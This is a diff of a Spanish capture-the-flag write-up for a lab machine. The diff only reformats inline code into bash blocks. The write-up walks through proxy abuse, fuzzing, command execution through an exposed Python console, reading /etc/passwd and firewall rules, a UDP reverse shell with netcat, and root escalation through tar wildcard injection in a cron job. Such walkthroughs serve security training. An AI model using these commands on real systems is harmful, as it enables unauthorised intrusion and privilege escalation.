@@ -45,7 +45,11 @@ nmap -sC -sV -p22,3128 10.10.10.21 -oN targeted
 
 #### Browsear la web por el puerto 3128{-}
 
-Browseando la web con el url `http://10.10.10.21:3128` no da un error que es normal porque no pasamos por el **squid-proxy**.
+Browseando la web con el url 
+```bash
+ http://10.10.10.21:3128 
+```
+ no da un error que es normal porque no pasamos por el **squid-proxy**.
 
 Utilizamos el **FoxyProxy** para añadir las credenciales del Proxy. Como no tenemos el usuario y la contraseña, dejamos estos datos
 vacios.
@@ -54,7 +58,11 @@ vacios.
 ![squid-foxy-o-creds](/assets/images/squid-foxy-no-creds.png) 
 #### Uso de curl con proxy {-}
 
-La idea aqui es utilizar la herramienta **curl** con en argumento `--proxy` para ver si el puerto 80 esta abierto.
+La idea aqui es utilizar la herramienta **curl** con en argumento 
+```bash
+ --proxy 
+```
+ para ver si el puerto 80 esta abierto.
 
 ```bash
 curl -s http://127.0.0.1 --proxy http://10.10.10.21:3128 | html2text
@@ -80,7 +88,15 @@ encontramos el puerto del tftp que esta abierto
 tftp 10.10.10.21
 ```
 
-Nos podemos conectar pero no podemos cojer ficheros como `/etc/passwd`, `/etc/hosts` y otros. Tiramos por el fichero de config de squid.
+Nos podemos conectar pero no podemos cojer ficheros como 
+```bash
+ /etc/passwd 
+```
+, 
+```bash
+ /etc/hosts 
+```
+ y otros. Tiramos por el fichero de config de squid.
 
 ```bash
 get /etc/squid/squid.conf
@@ -121,9 +137,17 @@ Hay una pagina que propone shortear una url. Vamos a testear el servicio web
     ```bash
     python -m http.server 80
     ```
-1. En el servicio intentamos shortear la url `http://10.10.14.20/test`
+1. En el servicio intentamos shortear la url 
+```bash
+ http://10.10.14.20/test 
+```
 
-No hace nada. Vemos en el codigo fuente que hay un recurso `/list`. La idea aqui es aplicar fuzzing. Como tenemos que pasar
+
+No hace nada. Vemos en el codigo fuente que hay un recurso 
+```bash
+ /list 
+```
+. La idea aqui es aplicar fuzzing. Como tenemos que pasar
 por un proxy, vamos a utilizar **Burp** para conectar el fuzzer con el proxy.
 
 1. Creamos un Proxy Server.
@@ -144,7 +168,11 @@ por un proxy, vamos a utilizar **Burp** para conectar el fuzzer con el proxy.
 
 
 ![bur-add-ort-80-2](/assets/images/burp-add-port-80-2.png) 
-Ya no nos pone el mensaje de error `Conexion reusada`, quiere decir que el server proxy que hemos creado con
+Ya no nos pone el mensaje de error 
+```bash
+ Conexion reusada 
+```
+, quiere decir que el server proxy que hemos creado con
 BurpSuite funciona. Ya podemos aplicar fuzzing.
 
 ### WFUZZ {-}
@@ -153,7 +181,11 @@ BurpSuite funciona. Ya podemos aplicar fuzzing.
 wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2-3-medium.txt http://127.0.0.1/FUZZ
 ```
 
-Encontramos el recurse `/console`
+Encontramos el recurse 
+```bash
+ /console 
+```
+
 
 ### Consola Interactiva {-}
 
@@ -167,8 +199,16 @@ os.system('whoami')
 0
 ```
 
-En este caso la respuesta al lado del servidor es `0`. Suponemos que la respuesta es el codigo de estado. Utilizamos la funccion
-`os.popen(<command>).read()` para ver el output normal.
+En este caso la respuesta al lado del servidor es 
+```bash
+ 0 
+```
+. Suponemos que la respuesta es el codigo de estado. Utilizamos la funccion
+
+```bash
+ os.popen(<command>).read() 
+```
+ para ver el output normal.
 
 ```python
 os.popen('whoami').read()
@@ -193,22 +233,38 @@ El comando funcionna. Ahora intentamos **pingear** nuestra maquina de atacante.
 Recibimos la trasa ICMP.
 
 Intentamos recuperar ficheros de la maquina victima antes de entablar una reverse shell. Como el comando
-`os.popen('cat /etc/passwd').read()` nos retorna el resultado en una linea y que no es muy legible, S4vi nos
+
+```bash
+ os.popen('cat /etc/passwd').read() 
+```
+ nos retorna el resultado en una linea y que no es muy legible, S4vi nos
 recomienda encriptar la respuesta en base 64 para despues decodificarlo en la maquina de atacante con el comando
-`echo "<cadena codificada en base64>" | base64 -d; echo`
+
+```bash
+ echo "<cadena codificada en base64>" | base64 -d; echo 
+```
+
 
 ```python
 os.popen('base64 -w 0 /etc/passwd').read()
 os.popen('base64 -w 0 /etc/iptables/rules.v4').read()
 ```
 
-El iptables nos muestra con la linea `-A OUTPUT -o ens33 -p tcp -m state --state NEW -j DROP` que la maquina victima nos
+El iptables nos muestra con la linea 
+```bash
+ -A OUTPUT -o ens33 -p tcp -m state --state NEW -j DROP 
+```
+ que la maquina victima nos
 va a rechazar todas las comunicaciones por **TCP**. Es por esta razon que no hemos creado directamente una reverse shell.
  ## Explotacion de vulnerabilidad & Ganando acceso {-}
 
 ### Reverse shell por UDP {-}
 
-1. En la maquina de atacante con el parametro `-u`
+1. En la maquina de atacante con el parametro 
+```bash
+ -u 
+```
+
 
     ```bash
     nc -u -nlvp 443
@@ -255,7 +311,15 @@ id
 sudo -l
 ```
 
-El comando `sudo -l` nos dice que podemos ejecutar `sudoedit /var/www/*/*/layout.html` como el usuario alekos. ## Escalada de privilegios {-}
+El comando 
+```bash
+ sudo -l 
+```
+ nos dice que podemos ejecutar 
+```bash
+ sudoedit /var/www/*/*/layout.html 
+```
+ como el usuario alekos. ## Escalada de privilegios {-}
 
 ### Escalada de privilegios al usuario alekos {-}
 
@@ -263,7 +327,11 @@ El comando `sudo -l` nos dice que podemos ejecutar `sudoedit /var/www/*/*/layout
 ls -l /var/www
 ```
 
-No tenemos capacidad de escritura en el directorio `/var/www` pero hay un directorio testing donde el usuario proprietario es werkzeug.
+No tenemos capacidad de escritura en el directorio 
+```bash
+ /var/www 
+```
+ pero hay un directorio testing donde el usuario proprietario es werkzeug.
 
 ```bash
 cd /var/www/testing
@@ -339,15 +407,31 @@ Ahora tenemos que saber lo que se esta poniendo en estos backups.
 
 mirando el contenido de fichero comprimido, nos damos cuenta que el contenido es el mismo que el directorio development.
 
-Saviendo esto estamos intuiendo que la tarea cron ejecuta un comando del estilo: `tar -cvf backup/test.tar.gz /home/alekos/development/*`.
-Aqui el problema es que si el comando es este, el simbolo `*` permitteria burlar el comando tar con breakpoints. Lo que queremos ejecutar seria
+Saviendo esto estamos intuiendo que la tarea cron ejecuta un comando del estilo: 
+```bash
+ tar -cvf backup/test.tar.gz /home/alekos/development/* 
+```
+.
+Aqui el problema es que si el comando es este, el simbolo 
+```bash
+ * 
+```
+ permitteria burlar el comando tar con breakpoints. Lo que queremos ejecutar seria
 el comando siguiente:
 
 ```bash
 tar -cvf backup/test.tar.gz /home/alekos/development/* --checkpoint=1 --checkpoint-action=exec/bin/sh
 ```
 
-El echo es que si el comando de la tarea cron tiene el asterisco y que ficheros tienen nombres como `--checkpoint=1` y `--checkpoint-action=exec/bin/sh`,
+El echo es que si el comando de la tarea cron tiene el asterisco y que ficheros tienen nombres como 
+```bash
+ --checkpoint=1 
+```
+ y 
+```bash
+ --checkpoint-action=exec/bin/sh 
+```
+,
 en vez de copiarlos, los utilizaria como argumentos del proprio comando tar.
 
 ```bash
@@ -374,7 +458,11 @@ Ya esta esperamos hasta el proximo run de la tarea cron.
 watch -n 1 ls -l /bin/bash -d
 ```
 
-Cuando vemos que la /bin/bash tiene el `s` de SUID podemos convertirnos en root
+Cuando vemos que la /bin/bash tiene el 
+```bash
+ s 
+```
+ de SUID podemos convertirnos en root
 
 ```bash
 bash -p
